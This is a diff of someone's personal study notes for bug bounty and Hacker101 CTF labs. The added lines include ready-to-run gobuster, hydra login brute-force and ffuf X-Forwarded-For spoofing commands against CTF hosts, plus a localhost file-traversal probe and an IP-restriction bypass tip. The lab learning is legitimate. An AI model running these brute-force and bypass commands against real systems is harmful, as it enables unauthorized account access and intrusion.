@@ -1,9 +1,7 @@
 Go to kali
-Tools:
-	gobuster
-
 Go to Downloads/Burpsuite
 run ./burp.sh
+
 
 
 OSWAP tutorials
@@ -15,6 +13,9 @@ COmplete after 3 labs:
 
 
 
+KALI wordlist
+Kali-menu > password profiling worklist
+
 
 
 ## Workflow on hackerone
@@ -22,9 +23,39 @@ COmplete after 3 labs:
 * tools probe
 	httpprobe
 	httpx
+	gobuster
+	fuff command
+
+	skipfish # test security for vulnerability
+
+	
+
+
+	
+	```
+	gobuster dir -u "https://801792902472a746ea6a94e81c370387.ctf.hacker101.com" -w Downloads/combined_words.txt -t 100
+
+	hydra [-l login| -L file]  [-p pass| -P password] [-u] [-f] [IP address][-s PORT] [Module: remote-http] [module-setting]
+	e.g.
+		
+	sudo hydra -L 10k-usernames.txt -P password-biglist.txt -u -f  801792902472a746ea6a94e81c370387.ctf.hacker101.com  https-post-form "/login:username=^USER^&password=^PASS^:F=invalid" -V -t 64
+
+	seq 0 255 > range.txt # Then run ffuf
+ 	ffuf -w range.txt:FUZZ1 -w range.txt:FUZZ2 -w range.txt:FUZZ3 -w range.txt:FUZZ4  -u https://0bfd51139862b5a11d4fb8d61b7f4465.ctf.hacker101.com/api/v1/secrets  -H "X-Forwarded-For: FUZZ1.FUZZ2.FUZZ3.FUZZ4"  -mode clusterbomb  -v -o results.json -fc 403,404,500
+
+	
+	```
+
+
+Famous word dict
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/combined_words.txt
+https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt?source=post_page-----8001ba11ed9c--------------------------------
 
 
 
+While doing file traversing check if the localhost is also getting mapped
+?page=http://localhost/index
+ref: Cody’s First Blog CTF
 
 
 
@@ -34,6 +65,8 @@ COmplete after 3 labs:
 - When user is able to send the request to get/change the data of other user
 - It is because of lack of access control on the specific endpoint
 
+when request is allowed for only few IPs and blocker for other, hence use some header
+`X-Forwarded-For: IP`
 
 
 
